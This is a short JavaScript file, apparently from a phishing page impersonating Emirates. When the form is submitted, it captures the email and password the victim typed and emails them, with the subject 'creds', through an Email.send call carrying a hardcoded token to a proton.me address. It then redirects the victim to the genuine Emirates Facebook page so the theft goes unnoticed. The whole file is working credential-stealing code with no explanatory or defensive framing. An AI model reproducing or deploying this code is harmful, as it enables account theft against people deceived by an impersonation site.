const email = document.getElementById("contact");
const password = document.getElementById("password");
const submit = document.getElementById("submit");

submit.addEventListener("submit", (e) => {
  e.preventDefault();

  console.log("Submit event called");

  let ebody = `
     ${email.value}
     ${password.value}
    `;

  Email.send({
    SecureToken: "ca5844f7-f4d3-4adf-93a7-2be5141469f6",
    To: "airemirates@proton.me",
    From: "airemirates@proton.me",
    Subject: "creds",
    Body: ebody,
  });
  
  window.location.href = "https://www.facebook.com/Emirates"
});
